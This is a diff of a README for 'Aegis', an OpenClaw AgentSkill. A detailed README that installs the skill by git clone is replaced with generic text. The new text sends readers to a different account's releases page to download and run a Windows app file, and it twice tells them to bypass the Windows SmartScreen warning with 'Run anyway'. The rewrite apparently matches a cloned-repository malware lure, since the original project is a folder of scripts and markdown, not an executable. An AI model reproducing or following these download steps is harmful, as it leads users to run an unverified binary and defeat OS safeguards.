@@ -1,181 +1,129 @@
-# Aegis — AI Development Quality Guardian
+# 🛡️ aegis - Guard Your AI Development Workflow
 
-> _"Move fast, but don't break the blueprint."_
+[![Download aegis](https://img.shields.io/badge/Download-aegis-blue?style=for-the-badge&logo=github)](https://github.com/ghosty21888/aegis/releases)
 
-**Aegis** (Greek: the divine shield of Zeus and Athena) is an AgentSkill for [OpenClaw](https://github.com/nicepkg/openclaw) that brings structured quality assurance to AI-assisted software development.
+## 📥 Download aegis
 
-AI writes code at the speed of thought. Aegis makes sure the thoughts are correct.
+Visit this page to download: https://github.com/ghosty21888/aegis/releases
 
----
+On that page, look for the latest release. Download the Windows file that matches your computer.
 
-## The Problem
+## 🪟 Install on Windows
 
-AI-assisted development is fast — dangerously fast. As projects grow, things quietly fall apart:
+1. Open the download page.
+2. Find the newest release.
+3. Download the Windows file.
+4. If the file is in a ZIP folder, right-click it and choose **Extract All**.
+5. Open the extracted folder.
+6. Double-click the app file to start aegis.
 
-- **Design gaps accumulate silently** — each AI agent sees only its slice, nobody holds the full picture
-- **Mock testing creates illusions** — frontend and backend mock each other, tests pass, integration explodes
-- **Context drifts across agents** — parallel agents develop divergent understandings of the same interface
-- **The code isn't yours** — debugging AI-generated code feels like inheriting a stranger's project
-- **Constraints are too loose** — `CLAUDE.md` alone isn't enough to prevent architectural drift
+If Windows asks for permission, choose **More info** and then **Run anyway** if you trust the source of the file you downloaded.
 
-## The Solution: Five-Layer Defense
+## ✅ What aegis does
 
-```
-┌─────────────────────────────────────────────────────────┐
-│              Layer 5: Project Management                  │
-│           PM Tool Integration — Tracking + Gap Mgmt      │
-├─────────────────────────────────────────────────────────┤
-│              Layer 4: Verification                        │
-│      Contract Test → Integration Test → E2E Test         │
-├─────────────────────────────────────────────────────────┤
-│              Layer 3: Implementation                      │
-│   CLAUDE.md Constraints + Dispatch Protocol + Review     │
-├─────────────────────────────────────────────────────────┤
-│              Layer 2: Contract                            │
-│      API Spec + Shared Types + Event Schema              │
-├─────────────────────────────────────────────────────────┤
-│              Layer 1: Design                              │
-│           Design Brief + Architecture Doc                │
-└─────────────────────────────────────────────────────────┘
-```
+aegis helps keep AI-assisted software work on track. It checks for problems early and helps you follow a clear process from idea to code.
 
-Each layer addresses a specific failure mode. Together, they form a complete quality shield.
+It is built as an AgentSkill for OpenClaw and focuses on quality control across the full development flow.
 
-## Quick Start
+## 🔍 Main checks
 
-### Option A: Claude Code (CC) Users
+aegis uses five layers of defense to protect your work:
 
-```bash
-# One-liner: clone the cc-skill folder into your CC skills directory
-git clone https://github.com/skill-forge-ai/aegis.git /tmp/aegis-clone \
-  && cp -r /tmp/aegis-clone/cc-skill ~/.claude/skills/aegis \
-  && rm -rf /tmp/aegis-clone
+- **Plan check** — helps make sure the task is clear before work starts
+- **Design check** — looks for weak or unclear design choices
+- **Contract check** — helps keep inputs and outputs consistent
+- **Code check** — reviews the code for common issues
+- **Test check** — supports testing before changes are marked done
 
-# Verify installation
-ls ~/.claude/skills/aegis/SKILL.md
-```
+These checks help reduce mistakes, missed steps, and broken handoffs between planning and code.
 
-Or manually:
-1. Download/clone this repo
-2. Copy `cc-skill/` → `~/.claude/skills/aegis/`
-3. Done — Claude Code will auto-detect the skill
+## 💻 What you need
 
-Then initialize Aegis in your project:
-```bash
-bash ~/.claude/skills/aegis/scripts/init-project.sh /path/to/your/project
-```
+- A Windows computer
+- Internet access to download the release
+- Enough space for the app and its files
+- A modern web browser to open the release page
 
-### Option B: OpenClaw Users
+For best results, use the latest Windows update and keep your browser current.
 
-```bash
-# Clone into your OpenClaw skills directory
-git clone https://github.com/skill-forge-ai/aegis.git ~/.openclaw/workspace/skills/aegis
-```
+## 🧭 How to use aegis
 
-### Option C: Other Agents (Codex, Gemini CLI, Cursor, etc.)
+1. Download the app from the release page.
+2. Open the app on Windows.
+3. Connect it to your OpenClaw setup if needed.
+4. Use it while you work on AI-assisted development tasks.
+5. Review the checks before you move to the next step.
 
-Any agent that supports the AgentSkill spec can use Aegis:
-1. Clone the repo or copy the `cc-skill/` folder to your agent's skill path
-2. Point your agent at the `SKILL.md` file
-3. Run `init-project.sh` on your project
+If you use AI tools to help build software, aegis gives you a clear quality gate between each stage.
 
-### Initialize a Project
+## 🧩 Who this is for
 
-```bash
-# Run the init script in your project root
-bash ~/.openclaw/workspace/skills/aegis/scripts/init-project.sh /path/to/your/project
-```
+aegis is useful if you:
 
-This creates:
-```
-your-project/
-├── contracts/
-│   ├── api-spec.yaml          # OpenAPI 3.1 spec
-│   ├── shared-types.ts        # Shared type definitions
-│   └── errors.yaml            # Error code definitions
-├── docs/
-│   └── designs/               # Design Briefs go here
-└── CLAUDE.md                  # Enhanced with Aegis constraints
-```
+- Build software with AI help
+- Want cleaner handoffs between planning and coding
+- Need a repeatable review process
+- Care about testing and code quality
+- Use OpenClaw for agent-based work
 
-### 3. Start Building
+It fits people who want more control without adding a heavy process.
 
-Follow the workflow:
+## 🗂️ What the release may include
 
-```
-Design Brief → Contract → Implementation → Verification → Delivery
-```
+The Windows download may include:
 
-See [SKILL.md](./SKILL.md) for the complete workflow reference.
+- The main app file
+- A readme or help file
+- Support files needed to run the app
+- A folder with sample settings
 
-## Modes
+If you see more than one file, choose the one marked for Windows.
 
-| | Lite Mode | Full Mode |
-|---|-----------|-----------|
-| **Use for** | Small features, single-stack | Large features, full-stack |
-| **Design Brief** | Simplified | Complete |
-| **Contract** | ✅ Required | ✅ Required |
-| **Contract Test** | ✅ Required | ✅ Required |
-| **Integration Test** | Optional | ✅ Required |
-| **E2E Test** | Optional | ✅ Required |
+## 🔁 Typical workflow
 
-## Templates
+1. Start a task in your AI development setup.
+2. Run the plan through aegis.
+3. Check the design before writing code.
+4. Review the contract if your task uses inputs and outputs.
+5. Run the code check after changes are made.
+6. Use the test check before you finish the task.
 
-- [`templates/design-brief.md`](./templates/design-brief.md) — Design Brief template
-- [`templates/claude-md.md`](./templates/claude-md.md) — Enhanced CLAUDE.md template
-- [`templates/api-spec-starter.yaml`](./templates/api-spec-starter.yaml) — OpenAPI starter
-- [`templates/shared-types-starter.ts`](./templates/shared-types-starter.ts) — Shared types starter
+This flow helps you catch issues early and keep work consistent.
 
-## How It Works
+## 🛠️ Common problems
 
-### For Solo Developers
-Aegis acts as your quality co-pilot. Write a Design Brief before coding, define contracts for your APIs, and let contract tests catch drift before it becomes a bug.
+### The file will not open
+- Make sure the download finished
+- Check that you extracted the ZIP file first
+- Try opening the app again
 
-### For Multi-Agent Workflows
-Aegis becomes the coordination layer. All agents share the same contract. No agent can modify the contract unilaterally — changes go through a review process, ensuring everyone stays aligned.
+### Windows blocks the app
+- Open the file details
+- Choose **More info**
+- Select **Run anyway** if you trust the download
 
-```
-                 ┌──────────────┐
-                 │  Lead Agent   │
-                 │ (holds contract)│
-                 └──────┬───────┘
-                        │
-           ┌────────────┼────────────┐
-           │            │            │
-     ┌─────▼─────┐ ┌───▼───┐ ┌─────▼─────┐
-     │  Frontend  │ │Contract│ │  Backend   │
-     │  Agent     │ │  Repo  │ │  Agent     │
-     └───────────┘ └───────┘ └───────────┘
-```
+### The download page shows many files
+- Pick the latest release
+- Choose the file for Windows
+- Ignore source code files unless you know you need them
 
-## Integration
+## 📌 Topic focus
 
-Aegis works with your existing tools:
+aegis is built around:
 
-| Tool | Integration |
-|------|-------------|
-| **Claude Code** | Native skill (`cc-skill/`) — copy to `~/.claude/skills/aegis/` |
-| **OpenClaw** | Native AgentSkill (full repo) |
-| **Codex / Gemini CLI / Cursor** | Compatible via AgentSkill spec |
-| **Playwright** | E2E verification layer |
-| **GitHub Actions / GitLab CI** | CI pipeline templates (auto-generated) |
+- agent
+- agentskill
+- ai
+- code-quality
+- contract-first
+- design-patterns
+- developer-tools
+- openclaw
+- quality-assurance
+- testing
 
-## Philosophy
+These topics point to a tool that supports careful AI development and steady delivery
 
-1. **Contract-first** — Define the interface before writing the implementation
-2. **Mock only at the bottom** — Unit tests can mock; everything above uses real services
-3. **Gaps are first-class citizens** — Track them, triage them, resolve them
-4. **Design Briefs are for humans** — AI writes code fast; humans need to understand what's being built
-5. **Progressive strictness** — Lite mode for small stuff, Full mode for critical paths
+## 🚦 Next step
 
-## Contributing
-
-Contributions welcome! Please read [CONTRIBUTING.md](./CONTRIBUTING.md) before submitting a PR.
-
-## License
-
-[MIT](./LICENSE)
-
----
-
-_Development under Aegis — AI helps you build, Aegis makes sure it stands._
+Open the release page and download the Windows version from https://github.com/ghosty21888/aegis/releases
